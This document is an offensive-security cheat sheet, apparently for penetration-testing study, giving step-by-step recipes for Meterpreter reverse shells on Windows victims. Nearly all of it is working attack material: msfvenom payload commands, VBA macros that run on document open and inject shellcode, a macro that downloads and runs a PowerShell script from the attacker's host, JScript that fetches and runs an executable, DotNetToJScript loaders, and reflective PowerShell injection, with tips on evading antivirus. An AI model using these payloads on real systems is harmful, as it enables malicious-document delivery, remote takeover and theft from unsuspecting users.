Meterpreter shells are more powerful than regular shells.

## VBA

User has to press 'Enable Content'

### pure bytes in VBA
<details>
1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f vbapplication`
2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
3. put this in your office document (make sure its saved as a Word 97-2003 document)
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    <paste output of 1 here>

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
</details>

However, this version (above) contains encoded meterpreter shell so might get detected by AV. Also, if the victim closes Word, we lose our shell. Version below fixes these:

### .ps1 reverse shell
<details>
1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
2. Save this file as `run.ps1` in the root folder of where u host your python http server
```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32
<output from 1 here>

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
3. In Kali, run `python3 -m http.server <port of your choice>`
4. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
5. put this in your VBA
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>:<http port>/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
</details>

## JScript

### Saves to disk
<details>
1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f exe -o met.exe`
2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
3. `python3 -m http.server <port of your choice>`
4. On victim, save this as `<filename>.js` and run it:
```
var url = "http://<kali ip>:<http port>/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```
</details>

### Does not save to disk
<details>
1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
2. I saved DotNetToJscript-master on the kali, copy it over, then run the .sln file. 
3. Navigate to TestClass.cs (on the right), then use this to replace the `public class TestClass` part:
```
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        <paste the output from 1>

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
5. Click Build -> Build Solution
6. Navigate to the `DotNetToJScript/bin/Release` folder and copy `DotNetToJscript.exe` and `NDesk.Options.dll` and then also go to `ExampleAssembly/bin/Release` folder and copy `ExampleAssembly.dll` into the same folder
7. In that folder, run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
8. Double-click demo.js
</details>

## Reflective Powershell
1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
2. In victim Powershell:
```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

<output from 1>

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```